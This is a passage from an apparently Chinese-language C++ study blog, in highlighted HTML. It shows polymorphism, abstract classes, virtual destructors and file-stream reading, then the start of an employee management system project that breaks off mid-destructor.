class="comment">//引用指向子类对象</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Dog dog;</span><br><span class="line">func(dog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//父类指针</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Animal* animal = <span class="keyword">new</span> Dog;</span><br><span class="line">animal-&gt;speak();</span><br><span class="line"><span class="keyword">delete</span> animal；</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test01();</span><br><span class="line">test02();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.纯虚函数和抽象类</p><p>在多态中，通常父类中虚函数的实现是毫无意义的，主要都是调用子类重写的内容，因此可以将虚函数改为<strong>纯虚函数</strong></p><p>纯虚函数语法：<code>virtual 返回值类型 函数名 （参数列表）= 0 ;</code></p><p>当类中有了纯虚函数，这个类也称为==抽象类==</p><p>抽象类特点：</p><ul><li>无法实例化对象</li><li>子类必须重写抽象类中的纯虚函数，否则也属于抽象类</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span><span class="keyword">public</span> Father</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func函数&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//Father f;//无法实例化对象</span></span><br><span class="line">Son s;</span><br><span class="line">s.func();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test01();</span><br><span class="line">system(<span class="string">&quot;puase&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.虚析构和纯虚析构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">////虚析构函数</span></span><br><span class="line"><span class="comment">//virtual ~Father()</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//纯虚析构函数</span></span><br><span class="line"><span class="keyword">virtual</span> ~Father() = <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line">Father::~Father()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span> :</span><span class="keyword">public</span> Father</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Son(<span class="keyword">int</span> num)</span><br><span class="line">&#123;</span><br><span class="line">m_num = <span class="keyword">new</span> <span class="keyword">int</span>(num);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;num is &quot;</span> &lt;&lt; m_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">~Son()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_num != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> m_num;</span><br><span class="line">m_num = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;son 析构函数&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> *m_num;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Father* father = <span class="keyword">new</span> Son(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">delete</span> father;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test01();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">(ifstream&amp; ifs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (ifs&gt;&gt;buf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; buf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test02</span><span class="params">(ifstream&amp; ifs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (ifs.getline(buf,<span class="keyword">sizeof</span>(buf)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; buf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test03</span><span class="params">(ifstream&amp; ifs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> buf;</span><br><span class="line"><span class="keyword">while</span> (getline(ifs,buf))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; buf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test04</span><span class="params">(ifstream&amp; ifs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">while</span> ((c = ifs.get()) != EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ofstream ofs1;</span><br><span class="line">ofs1.open(<span class="string">&quot;txt.txt&quot;</span>, ios::trunc);</span><br><span class="line">ofs1 &lt;&lt; <span class="string">&quot;姓名：张三&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ofs1 &lt;&lt; <span class="string">&quot;性别：男&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ofs1 &lt;&lt; <span class="string">&quot;年龄：18&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ofs1.close();</span><br><span class="line"></span><br><span class="line">ifstream ifs2;</span><br><span class="line">ifs2.open(<span class="string">&quot;txt.txt&quot;</span>, ios::in);</span><br><span class="line"><span class="keyword">if</span> (!ifs2.is_open())</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;文件打开失败&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//test01(ifs2);</span></span><br><span class="line"><span class="comment">//test02(ifs2);</span></span><br><span class="line"><span class="comment">//test03(ifs2);</span></span><br><span class="line">test04(ifs2);</span><br><span class="line">ifs2.close();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="职工管理系统"><a href="#职工管理系统" class="headerlink" title="职工管理系统"></a>职工管理系统</h3><p>跟着写了写，还不错。</p><p>workerManager.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  FILENAME <span class="meta-string">&quot;empFile.txt&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;worker.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WorkerManager</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">WorkerManager();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Showmenu</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddEmp</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShowEmp</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetEmpNum</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EmptoFile</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Savefile</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">IsExist</span><span class="params">(<span class="keyword">int</span> id)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DeleteEmp</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UpdateEmp</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">FindEmp</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SortEmp</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearFile</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">~WorkerManager();</span><br><span class="line"><span class="keyword">int</span> m_Empnum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> m_FileEmpty;</span><br><span class="line">Worker** m_EmpArray;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>workerManager.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;workerManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;employee.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;boss.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;manager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line">WorkerManager::WorkerManager()</span><br><span class="line">&#123;</span><br><span class="line">ifstream ifs;</span><br><span class="line"><span class="keyword">char</span> ch;</span><br><span class="line">ifs.open(FILENAME, ios::in);</span><br><span class="line">ifs &gt;&gt; ch;</span><br><span class="line"><span class="comment">//没有这个文件</span></span><br><span class="line"><span class="keyword">if</span> (!ifs.is_open())</span><br><span class="line">&#123;</span><br><span class="line">m_FileEmpty = <span class="literal">true</span>;</span><br><span class="line">m_Empnum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_EmpArray = <span class="literal">NULL</span>;</span><br><span class="line">ifs.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ifs.eof())</span><br><span class="line">&#123;</span><br><span class="line">m_FileEmpty = <span class="literal">true</span>;</span><br><span class="line">m_Empnum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">this</span>-&gt;m_EmpArray = <span class="literal">NULL</span>;</span><br><span class="line">ifs.close();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">GetEmpNum();</span><br><span class="line">EmptoFile();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">WorkerManager::~WorkerManager()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_EmpArray != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span 